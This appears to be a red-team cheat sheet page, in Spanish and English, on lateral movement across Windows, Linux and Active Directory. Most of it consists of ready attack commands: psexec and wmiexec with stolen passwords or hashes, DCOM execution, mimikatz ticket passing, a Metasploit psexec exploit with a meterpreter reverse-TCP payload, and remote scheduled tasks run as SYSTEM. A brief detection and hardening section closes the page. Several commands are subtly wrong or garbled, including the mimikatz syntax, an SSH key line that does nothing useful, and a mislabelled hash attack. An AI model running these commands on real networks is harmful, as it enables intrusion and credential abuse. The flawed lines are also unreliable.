---
title: Lateral Movement
phase: post-explotacion
platform: [windows, linux, ad]
tags: [lateral-movement, wmi, psexec, ssh, winrm]
risk: high
attack_tactic: TA0008
attack_technique: T1021
data_sources: [security-events, sysmon, network-traffic, rdp-logs]
last_review: 2026-05-25
---

# Lateral Movement

### Objetivo

Mover se entre sistemas en la red usando credenciales robadas o vulnerabilidades para expandir el control sobre el entorno.

### Windows

```cmd
# PsExec
psexec.py domain/user:password@target cmd

# WMI
wmiexec.py domain/user:password@target

# RDP
xfreerdp /v:target /u:user /p:password +clipboard
remmina

# WinRM / PSRemoting
powershell -c "Enter-PSSession -ComputerName target -Credential (Get-Credential)"

# DCOM
powershell -c "$c = [Type]::GetTypeFromProgID('MMC20.Application','target'); $o = [System.Activator]::CreateInstance($c); $o.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c calc','')"
```

### Linux

```bash
# SSH key moving
ssh user@target "bash -c 'cat >> ~/.ssh/authorized_keys < ~/.ssh/id_rsa.pub'"

# Password SSH
ssh user@target

# Ansible/salt wins SH
ansible target -m shell -a "whoami" -k
```

### Pass-the-Hash / Ticket

```bash
# Overpass the hash
python wmiexec.py -hashes :NTLMHASH domain/user@target

# Pass the ticket (golden/silver)
mimikatz # kerberos::ppticket /ticket:ticket.kirbi /service:krbtgt
```

### Remote Execution via Vulnerability

```bash
# PSEXEC via SMB exploit
msfconsole -q -x "use exploit/windows/smb/psexec; set RHOST target; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit"
```

### One-liners

```bash
# schtasks lateral movement
schtasks /create /tn "Update" /tr "cmd /c calc" /sc once /st 00:00 /S target /RU SYSTEM

# WMIEXEC one-liner
python wmiexec.py domain/user:password@target "whoami"
```

### Detección y Mitigación

- **Visibilidad:** Security Event 4624 (lateral movement with RDP/WMI), 4688 (new process via remote session), Sysmon EID 3 (SMB connection).
- **Hardening:** Disable WMИ, limit admin shares, NLA for RDP, restrict remote RPC, implement network segmentation.

### Validación de Cobertura

- **Prueba técnica:** atomic-red-team T1021 (lateral movement).
- **Criterio de éxito:** SIEM alerts on remote process creation via WMI/Psexec.
